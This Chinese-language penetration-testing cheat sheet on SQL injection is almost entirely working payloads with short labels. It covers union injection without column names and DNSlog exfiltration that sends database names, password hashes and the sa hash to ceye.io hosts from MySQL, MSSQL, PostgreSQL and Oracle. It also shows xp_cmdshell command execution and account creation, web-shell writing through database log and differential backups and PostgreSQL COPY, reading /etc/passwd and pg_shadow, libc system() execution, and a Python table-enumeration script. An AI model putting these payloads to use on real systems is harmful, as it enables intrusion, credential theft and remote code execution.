  #### 注入无列名
	http://url/index.php?id=1 order by 6
	http://url/index.php?id=-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
	http://url/index.php?id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
  #### 结合dnslog
	MYSQL结合dnslog
	?id=1' and if((select load_file(concat('\\\\',(select database()),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示数据库
	?id=1' and if((select load_file(concat('\\\\',(select schema_name from information_schema.schemata limit {0},1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示表
	?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='dbname' limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	?id=1' and if((select load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=0x1x1x2x limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示字段
	?id=1' and if((select load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	显示数据
	?id=1' and if((select load_file(concat('\\\\',(select hex(user) from users limit 0,1),'.jhsefs.ceye.io\\sql_test'))),1,0)--+
	MSSQL结合dnslog
	查数据
	?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io';EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"');
	Sa密码
	?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';EXEC('master..xp_dirtree"\'+@host+'\foobar$"');
	执行命令
	exec master..xp_cmdshell "whoami>D:/temp%26%26certutil -encode D:/temp D:/temp2%26%26findstr /L /V ""CERTIFICATE"" D:/temp2>D:/temp3";
	exec master..xp_cmdshell "cmd /v /c""set /p MYVAR=< D:/temp3 %26%26 set FINAL=!MYVAR!.xxx.ceye.io %26%26 ping !FINAL!""";
	exec master..xp_cmdshell "del ""D:/temp"" ""D:/temp2"" ""D:/temp3""";
	postgreSQL结合dnslog
	?id=1;DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (select encode(pass::bytea,'hex') from test_user where id =1);exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\'';EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
	Oracle结合dnslog
	?id=1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;
	?id=1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;
	?id=1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;
	?id=1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL;
  #### 拿shell
	判断数据库
	;and (select count(*) from sysobjects)>0 mssql
	;and (select count(*) from msysobjects)>0 access
	查库
	?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)>0 --
	?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in ('master'))>0 --
	查表
```python
import requests
import re
table_list = ['']
	def get_sqlserver_table(table_list, table_num):
		for num in range(0,table_num):
			# print("','".join(table_list))
			sql_str = "and (select top 1 name from [xxxx].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('{}'))>0".format("','".join(table_list))
			url = "http://www.xxxxx.cn/x.aspx?cid=1' {} AND 'aNmV'='aNmV".format(sql_str)
			r = requests.get(url, headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'})
			res = re.search(r'\'(.*)\'', r.content.decode('utf-8'),  re.M|re.I)
			table_name = str(res.group(1))
			table_list.append(table_name)
			print("[{}] - TableName: {}".format(str(r.status_code), table_name))
	if __name__ == "__main__":
		get_sqlserver_table(table_list, 16)
```
	判断是否存在xp_cmdshell
	and 1=(select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell')
	执行命令
	;exec master..xp_cmdshell "net user name password /add"—
	查看权限
	and (select IS_SRVROLEMEMBER('sysadmin'))=1--  //sa
	and (select IS_MEMBER('db_owner'))=1--   //  dbo
	and (select IS_MEMBER('public'))=1--  //public
	站库分离获取服务器IP
	;insert into OPENROWSET('SQLOLEDB','uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;', 'select * from dest_table') select * from src_table;--
	LOG备份
	;alter database testdb set RECOVERY FULL --
	;create table cmd (a image) --
	;backup log testdb to disk = 'c:\wwwroot\shell.asp' with init --
	;insert into cmd (a) values ('<%%25Execute(request("chopper"))%%25>')-- 
	;backup log testdb to disk = 'c:\wwwroot\shell.asp' –
	2000差异备份
	;backup database testdb to disk ='c:\wwwroot\bak.bak';--
	;create table [dbo].[testtable] ([cmd] [image]);--
	;insert into testtable (cmd) values(木马hex编码);--
	;backup database testdb to disk='c:\wwwroot\upload\shell.asp' WITH DIFFERENTIAL,FORMAT;--
	2005差异备份
	;alter/**/database/**/[testdb]/**/set/**/recovery/**/full—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
	;create/**/table/**/[itpro]([a]/**/image)—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
	;insert/**/into/**/[itpro]([a])/**/values(木马hex编码)—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=木马保存路径的SQL_EN编码/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
	;drop/**/table/**/[itpro]—
	;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
	PostgreSQL写shell
	连接
	>psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432
	查看版本
	>select version();
	列出数据库
	>select datname from pg_database;
	列出所有表名
	>select * from pg_tables;
	读取账号秘密
	>select usename,passwd from pg_shadow;
	当前用户
	>select user;
	修改密码
	>alter user postgres with password '123456';
	列目录
	>select pg_ls_dir('/etc');
	读文件
	>select pg_read_file('postgresql.auto.conf',0,100); #行数
	&
	>drop table wooyun;
	>create table wooyun(t TEXT);
	>copy wooyun FROM '/etc/passwd';
	>select * from wooyun limit 1 offset 0;
	&
	>select lo_import('/etc/passwd',12345678);
	>select array_agg(b)::text::int from(select encode(data,'hex')b,pageno from pg_largeobject where loid=12345678 order by pageno)a;
	写文件
	create table shell(shell text not null);
	insert into shell values($$<?php @eval($_POST[1]);?>$$);
	copy shell(shell) to '/var/www/html/shell.php';
	&
	copy (select '<?php phpinfo();?>') to '/var/www/html/shell.php';
	爆破
	MSF>use auxiliary/scanner/postgres/postgres_login
	执行命令版本8.2以下
	>create function system(cstring) returns int AS '/lib/libc.so.6', 'system' language C strict;
	>create function system(cstring) returns int AS '/lib64/libc.so.6', 'system' language C strict;
	>select system('id');
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/664.png)
